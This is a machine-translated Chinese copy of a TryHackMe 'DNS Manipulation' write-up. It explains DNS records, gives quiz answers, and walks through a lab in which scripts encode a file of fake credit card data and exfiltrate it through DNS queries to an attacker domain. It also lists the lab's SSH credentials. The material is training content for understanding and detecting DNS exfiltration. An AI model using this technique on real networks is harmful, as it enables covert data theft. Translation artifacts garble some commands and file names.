<html>
<head>
<title>DNS Manipulation Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">DNS操纵尝试黑客技术</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/dns-manipulation-tryhackme-writeup-7b625023a9a3?source=collection_archive---------2-----------------------#2021-04-20">https://infosecwriteups.com/dns-manipulation-tryhackme-writeup-7b625023a9a3?source=collection_archive---------2-----------------------#2021-04-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b52e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">作者Shamsher khan这是Tryhackme room“DNS操纵”的一篇文章</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/21e38c69822aaf5ba2e0391582dc86f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/format:webp/1*rrcSeZobGUjbUwVISkdjhw.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://www.tryhackme.com/room/dnsmanipulation" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/dnsmanipulation</a></figcaption></figure><p id="ceb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">房间链接:</strong><a class="ae kx" href="https://www.tryhackme.com/room/dnsmanipulation" rel="noopener ugc nofollow" target="_blank">https://www.tryhackme.com/room/dnsmanipulation</a><br/><strong class="jp ir">注:此房免费</strong></p><h1 id="ab94" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务1:介绍</h1><p id="9803" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在这个房间里，我们将研究DNS并展示用于渗透数据的技术。首先，我们将了解DNS的用途、工作原理以及DNS记录的类型。</p><p id="0065" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下图说明了一个基本的DNS查找。在这里，客户机通过DNS服务器将完全合格的域名(FQDN)解析为IP地址。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/178f95c0e0f56b4df7b06af7baaf864e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*dFQwdWXtTqTM9hWu.png"/></div></div></figure><p id="42d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们将讨论如何通过DNS查询将DNS用作“数据过滤”和“数据渗透”工具。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/2b2fc09ea5fd5b41852ccc8eab30f6a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*p1lA9ZlyGByHyx1V.png"/></div></div></figure><p id="eaf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们将了解DNS隧道，以及它如何用于通过DNS“隧道”不同的协议，如(HTTP)。</p><h1 id="1a16" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务2:安装</h1><p id="05e6" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated"><strong class="jp ir">【用于DNS渗透和渗透的Python代码】</strong></p><p id="99a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我为您创建了几个用Python编写的简单脚本来完成本演练。这将允许我们对远程DNS服务器进行DNS查询。<br/> <code class="fe mg mh mi mj b">git clone <a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil" rel="noopener ugc nofollow" target="_blank">https://github.com/kleosdc/dns-exfil-infil</a></code></p><p id="1b8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，确保您拥有运行Python代码所需的Python3模块。</p><p id="5ff5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用以下命令安装所需的模块:</p><p id="9477" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi mj b">sudo pip3 install -r requirements.txt</code></p><p id="61a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【用于DNS隧道的程序】</strong></p><p id="31de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://github.com/yarrick/iodine" rel="noopener ugc nofollow" target="_blank">https://github.com/yarrick/iodine</a></p><p id="d028" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi mj b">sudo apt install iodine</code></p><p id="7b64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【下载Wireshark】</strong></p><p id="942b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用Wireshark或tshark来捕获数据包。python代码使用。PCAP文件提取捕获的数据，然后解码它。<br/><a class="ae kx" href="https://www.wireshark.org/download.html" rel="noopener ugc nofollow" target="_blank">https://www.wireshark.org/download.html</a></p><p id="c7f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi mj b">sudo apt install -y tshark</code></p><h1 id="c135" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务3:[设置]自定义公共DNS服务器</h1><p id="e1bb" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">如果你想建立和我一样的环境，你需要一个<strong class="jp ir">公共域名</strong>和一个<strong class="jp ir">公共服务器</strong>。</p><p id="e321" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不会扩大购买域名或提供面向公众的服务器，因为没有必要完成这个房间。</p><p id="19e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，<strong class="jp ir"> STOK </strong>已经创建了一个关于如何为OOB(带外)数据渗透设置一切的优秀教程:<a class="ae kx" href="https://www.youtube.com/watch?v=p8wbebEgtDk" rel="noopener ugc nofollow" target="_blank"> STOK的视频</a></p><h1 id="9578" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务4:什么是DNS？</h1><p id="e71d" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">介绍</p><p id="0ffb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在高层次上，域名系统是指用IP地址解析域名的命名系统。DNS服务器分布在世界各地，它们以一种系统的方式不断更新和同步。当用户使用诸如tryhackme.com<a class="ae kx" href="http://tryhackme.com" rel="noopener ugc nofollow" target="_blank">之类的域名发出请求时，DNS会将其“翻译”成IP地址，然后最终向请求者提供正确的IP地址。还值得注意的是，在某些情况下，如果DNS记录由Cloudflare的DDoS protection等服务代理，则DNS返回的IP地址并不总是原始服务器的IP地址。</a></p><p id="92b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从技术上来说，每台连接到互联网的设备都有一个IP地址，在与其他互联网设备通信时，该地址充当身份标识。因此，了解DNS的主要功能和“翻译”所经历的层次结构至关重要。</p><p id="f52a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS根域名服务器位于DNS层次结构的顶端或“根”,在互联网中扮演着重要角色。所有顶级域名(TLD)“区域”的信息，如。com，co.uk，。net及其相关的域名服务器位于分布在世界各地的数百个根域名服务器中。</p><p id="5206" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是Cloudflare的一个插图，可以更好地描述这种层次结构。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mk"><img src="../Images/f9fdec541fbcf44989aa366a46c66e18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8cwm4c3PzHhwkfmJ.png"/></div></div></figure><p id="c532" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来源:<a class="ae kx" href="https://www.cloudflare.com/learning/dns/glossary/dns-root-server/" rel="noopener ugc nofollow" target="_blank">https://www . cloud flare . com/learning/DNS/glossary/DNS-root-server/</a></p><p id="8dc7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是包含根服务器和DNS区域更多信息的一些资源:</p><p id="5b33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://www.cloudflare.com/learning/dns/glossary/dns-root-server/" rel="noopener ugc nofollow" target="_blank">https://www . cloud flare . com/learning/DNS/glossary/DNS-root-server/</a></p><p id="ca99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://www.cloudflare.com/learning/dns/glossary/dns-zone/" rel="noopener ugc nofollow" target="_blank">https://www.cloudflare.com/learning/dns/glossary/dns-zone/</a></p><p id="c0a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://www.iana.org/domains/root/servers" rel="noopener ugc nofollow" target="_blank">https://www.iana.org/domains/root/servers</a></p><p id="eeae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有更多的DNS记录类型。但是，为了完成本演练，没有必要知道它们。</p><p id="73ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想了解有关DNS记录类型的更多信息，请参考本文:</p><p id="f05a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://www.cloudflare.com/learning/dns/dns-records/。</p><p id="9cbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题1: </strong>如果您使用的是Windows，您可以使用什么命令来查询“youtube.com”的txt记录？</p><blockquote class="ml mm mn"><p id="e7ea" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated">【youtube.com】答案:nslookup-type = txt</p></blockquote><p id="f724" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题2: </strong>如果你在Linux上，可以用什么命令来查询“facebook.com”的txt记录？</p><blockquote class="ml mm mn"><p id="5e52" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">回答:挖facebook.com txt</strong></p></blockquote><p id="16fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问3: </strong> AAAA会将哪种类型的IP地址与主机名一起存储？</p><blockquote class="ml mm mn"><p id="7bf8" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:IPv6 </strong></p></blockquote><p id="474d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题4:</strong>DNS TXT记录的最大字符数为256。(是/不是)</p><blockquote class="ml mm mn"><p id="214b" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">回答:否</strong></p></blockquote><p id="162d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问5: </strong>什么DNS记录在反向查找中提供域名？(研究)</p><blockquote class="ml mm mn"><p id="a732" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:PTR </strong></p></blockquote><p id="61cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题6: </strong>以下IPv4地址的反向查找是什么？(192.168.203.2)(研究)</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/da6e149cfca7549c58f717e48c862a91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*j8IqMrgKwCs0h2fnTOO1mg.png"/></div></figure><blockquote class="ml mm mn"><p id="8e44" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:2.203.168.192.in-addr.arpa </strong></p></blockquote><h1 id="de82" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务5:什么是DNS渗出？</h1><p id="a4fe" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">DNS渗透是通过DNS对服务器进行的网络攻击，根据攻击者的物理位置和与目标设备的接近程度，可以手动或自动执行。在手动情况下，攻击者通常会获得对目标设备的未经授权的物理访问权，以便从环境中提取数据。而在自动DNS渗透中，攻击者使用恶意软件在受损网络内部进行数据渗透。</p><p id="478a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS是一种通常在目标计算机上可用的服务，通常允许TCP或UDP端口53上的出站流量。这使得DNS成为黑客用来泄露数据的首选。</p><p id="0c74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过DNS的数据泄漏可能允许攻击者从目标环境中传输大量数据。此外，DNS渗透主要用作收集个人信息的途径，如社会安全号码、知识产权或其他个人身份信息。</p><p id="4c07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS过滤主要通过向DNS UDP请求添加包含所需“loot”的字符串来使用。然后，包含loot的字符串将被发送到记录这些请求的流氓DNS服务器。对于未经培训的人来说，这可能看起来像正常的DNS流量，或者这些请求可能会在许多合法DNS请求的混乱中丢失。</p><p id="2e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问1:</strong>DNS名称的最大长度是多少？(研究)(<strong class="jp ir">长度包括圆点！</strong>)</p><blockquote class="ml mm mn"><p id="04ae" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:253 </strong></p></blockquote><h1 id="c0b4" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务6: DNS渗透—演示</h1><p id="53b2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">介绍</p><p id="ad38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个示例场景中，攻击者试图将数据泄漏到他们的系统中，并决定他们的最佳选择是使用DNS查询。攻击者的目标是从SecureCorp网络上的机器中泄漏敏感信息。在这个演示中，我将展示攻击者可能采取的步骤，以便从受损的机器中泄漏这些数据。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/d37014749e84df4fb854d345c4a605c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tHW8m4ZP0CdVt1uf.png"/></div></div></figure><p id="7db4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下材料是通过假信用卡生成器生成的。所有信用卡信息都是假的。</p><p id="1991" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个演示使用的文件在我在GitHub上的dns-exfil-infil repo中。你将需要文件来完成房间的其余部分。</p><ol class=""><li id="2df5" class="mt mu iq jp b jq jr ju jv jy mv kc mw kg mx kk my mz na nb bi translated">secure corp . txt(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt" rel="noopener ugc nofollow" target="_blank">https://github . com/kleosdc/DNS-exfil-infil/blob/main/secure corp . txt</a></li><li id="e313" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">packet y . py(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py" rel="noopener ugc nofollow" target="_blank">https://github . com/kleosdc/DNS-exfil-infil/blob/main/packet y . py</a>)</li><li id="7cd9" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk my mz na nb bi translated">packet grabber . py(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py" rel="noopener ugc nofollow" target="_blank">https://github . com/kleosdc/DNS-exfil-infil/blob/main/packet grabber . py</a>)</li></ol><p id="3195" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.包含假信用卡号码，姓名，地址的文本文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nh"><img src="../Images/082a9e7bd6cd391d3dd5fd6f058a4a21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Vr27e7wddC515zja.PNG"/></div></div></figure><p id="23be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.packet y . py(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil" rel="noopener ugc nofollow" target="_blank">https://github.com/kleosdc/dns-exfil-infil</a>)</p><p id="e8fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当执行<a class="ae kx" href="http://packety.py/" rel="noopener ugc nofollow" target="_blank"> packety.py </a>时，您需要为脚本提供以下输入:</p><p id="c03a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* <strong class="jp ir">文件名</strong>:(这是您试图从SecureCorp的网络中泄漏的文件(建议使用文本文件)</p><p id="e71c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* <strong class="jp ir">域名</strong>:(这是你要放域名的地方，比如我的域名是badbaddoma.in)</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ni"><img src="../Images/91b584ee723a799c750c60c17f9b2bd7.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/0*MPwQm_Pt9GXmw8zs.PNG"/></div></div></figure><p id="7f74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">python packety.py</p><p id="38ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">文件名:securecorp.txt</p><p id="0295" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">域名(例如:badbaddoma.in): badbaddoma.in</p><p id="3bae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">[+]正在读取文件。</p><p id="6284" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">[+] Base64编码。</p><p id="615f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">[+] Base58编码。</p><p id="9f5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始传输…[按回车键]</p><p id="8e47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">代码从读取文本文件开始。文本文件的内容将首先进行Base64编码，然后进行Base58编码。这留给我们一个长的编码字符串。然后，字符串被分成20个字符长的部分，每个部分将添加3个“虚拟”字符，以便进一步混淆。一个字符将被添加到编码字符串的前面，两个字符将被添加到后面。</p><p id="087f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，编码数据的一部分可能如下所示:'<strong class="jp ir">6 gfghhjywsas 3r 4g hda 3</strong>'。在添加额外的字符后，它将以“<strong class="jp ir">x 6 gfghhjywsas 3r g 4 hda 3 Yu</strong>”结束。</p><p id="692f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦一切都被编码并准备好，代码将等待用户按下“ENTER”键，以便开始将查询传输到DNS服务器。DNS服务器可能已经设置为使用“Wireshark”或“tshark”来捕获传入的请求。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nj"><img src="../Images/4e9781062eac921f96570809bb2ecbd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*bd5MVbAqJIiauI8o.PNG"/></div></div></figure><p id="2868" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后就是等传输达到100%的问题了。如果任何一个查询没有按正确的顺序按时提交，那么泄露的数据将是不完整的，对攻击者来说是无用的。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nk"><img src="../Images/c2a09619e0a117ff01d5256768f82c64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*nbDYoG1FmIRxG-hE.PNG"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/50448fca5299e34f492881f109e30024.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*hkn66M8Bv0UJVVkf.PNG"/></div></div></figure><p id="243e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.packet grabber . py(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil" rel="noopener ugc nofollow" target="_blank">https://github.com/kleosdc/dns-exfil-infil</a>)</p><p id="1218" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该代码将要求用户输入以下内容:</p><p id="e591" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* <strong class="jp ir">文件被捕获</strong>:这是。您在DNS服务器上捕获的pcap文件。</p><p id="ca1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* <strong class="jp ir">文件名输出</strong>:这是保存解码数据的文件名。</p><p id="c3d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">* <strong class="jp ir">域名</strong>:这将是你的域名。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/ec3f4fb5a8430aa375f764b6b2c692bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*t3MBtYJ8Rgw1I-V_.PNG"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/fa57ce32217153bc685f5e094e861b86.png" data-original-src="https://miro.medium.com/v2/resize:fit:958/format:webp/1*egTZ55yfe3Da2WKb3K8cew.png"/></div></figure><p id="13a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果一切顺利，没有丢失任何查询，并且所有输入都是正确的；包含解码数据的文件将保存在运行代码的目录中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi no"><img src="../Images/3783fcef873265a165055b397f0cc845.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/0*URAlasUC2_zHjFQT.PNG"/></div></figure><h1 id="40fb" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务7: DNS渗透—练习</h1><p id="dc5a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">SSH凭据:</p><pre class="km kn ko kp gt np mj nq nr aw ns bi"><span id="6840" class="nt kz iq mj b gy nu nv l nw nx">Username: user<br/>Password: P@ssword01</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/19809ee6786ad4a6a5c2e3a036ddc8d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bIy3vKEiqyXxrKYLmSfXbw.png"/></div></div></figure><p id="45f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用问题中提供的ssh凭证登录。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ny"><img src="../Images/31662e3972bd106ba65db176eef88436.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wp2fVAGDtfO1NPNPz_SUTQ.png"/></div></div></figure><p id="b193" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我在order.pcap上运行packetyGrabber</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/2d34fb86f75fd04232518339b46ace3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*aQGIemINjbhGAEe--UKPew.png"/></div></figure><p id="3e39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Q.1: </strong>交易名称是什么？(按您看到的样子键入)</p><blockquote class="ml mm mn"><p id="cc7f" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">答案:网络装备。</em>T13】</strong></p></blockquote><p id="f2c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki 